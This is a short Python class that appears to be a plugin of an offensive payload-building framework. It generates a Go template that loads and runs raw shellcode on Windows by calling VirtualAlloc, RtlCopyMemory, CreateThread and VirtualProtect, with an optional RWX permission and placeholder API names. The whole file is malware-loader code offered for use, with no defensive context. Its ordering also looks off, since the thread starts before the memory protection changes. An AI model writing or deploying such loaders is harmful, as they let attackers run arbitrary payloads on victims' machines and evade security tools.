from string import Template

class shellcoderunner:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'

    def imports(self) -> list[str]:
        return ['unsafe',
                'golang.org/x/sys/windows']

    def compilerOptions(self) -> list[str]:
        return ["golang.org/x/sys/windows"]

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return Template("""
    {transformers}

	addr, _, _ := {VirtualAlloc}(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	{RtlCopyMemory}(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	thread, _, _ := {CreateThread}(0, 0, addr, uintptr(0), 0, 0)

    oldProtect := 0
	_, _, _ = {VirtualProtect}(addr, uintptr(len(shellcode)), windows.$memoryPermission, uintptr(unsafe.Pointer(&oldProtect)))

	{WaitForSingleObject}(thread, 0xFFFFFFFF)
""").substitute(memoryPermission = self.memoryPermission)